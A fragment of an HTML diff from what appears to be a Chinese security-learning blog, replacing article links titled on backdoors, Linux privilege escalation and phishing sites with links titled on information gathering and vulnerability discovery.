-    <a href="/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/">
+    <a href="/p/1.31-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.12 进阶后门操作</h2>
+            <h2 class="article-title">1.31 信息搜集</h2>
         </div>
     </a>
 </article>
@@ -697,12 +717,12 @@
             
                 
 <article class="">
-    <a href="/p/1.11-linux%E6%8F%90%E6%9D%83%E7%BB%AD%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/">
+    <a href="/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.11 Linux提权(续)和钓鱼网站</h2>
+            <h2 class="article-title">1.30 漏洞挖掘</h2>
         </div>
     </a>
 </article>
